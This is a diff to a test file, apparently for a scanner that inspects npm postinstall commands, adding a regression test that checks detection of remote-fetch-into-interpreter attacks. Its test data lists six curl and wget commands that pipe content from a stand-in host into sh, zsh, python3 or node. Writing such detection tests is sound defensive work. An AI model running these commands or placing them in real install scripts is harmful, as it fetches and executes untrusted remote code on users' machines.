@@ -42,6 +42,31 @@ describe("inspectScriptCommand", () => {
   it("returns no findings for benign build commands", () => {
     expect(inspectScriptCommand("postinstall", "node-gyp rebuild")).toEqual([]);
   });
+
+  // Regression (P0.2): the shell pattern used to match only `bash` and
+  // `sh -c`, so the canonical `curl … | sh` remote-payload attack was NOT
+  // detected as a shell invocation and therefore never became a hard block.
+  it.each([
+    "curl -sSL https://evil.example/i.sh | sh",
+    "wget -qO- https://evil.example/i | sh",
+    "curl https://evil.example | zsh",
+    "sh -c 'curl https://evil.example | sh'",
+    "curl https://evil.example | python3",
+    "wget -qO- https://evil.example | node",
+  ])("flags remote-fetch-into-interpreter: %s", (cmd) => {
+    const findings = inspectScriptCommand("postinstall", cmd);
+    expect(findings.join(" ")).toContain("downloads content from the network");
+    expect(findings.join(" ")).toMatch(/invokes a shell/);
+  });
+
+  it("does not treat a .sh filename or a bare node build as a shell invocation", () => {
+    expect(inspectScriptCommand("postinstall", "node build.js")).toEqual([]);
+    expect(inspectScriptCommand("postinstall", "tsc && node dist/index")).toEqual([]);
+    // referencing a build.sh file (no shell command token) must not match
+    expect(
+      inspectScriptCommand("postinstall", "cp scripts/build.sh dist/").join(" "),
+    ).not.toContain("invokes a shell");
+  });
 });
 
 describe("referencedScriptFiles", () => {
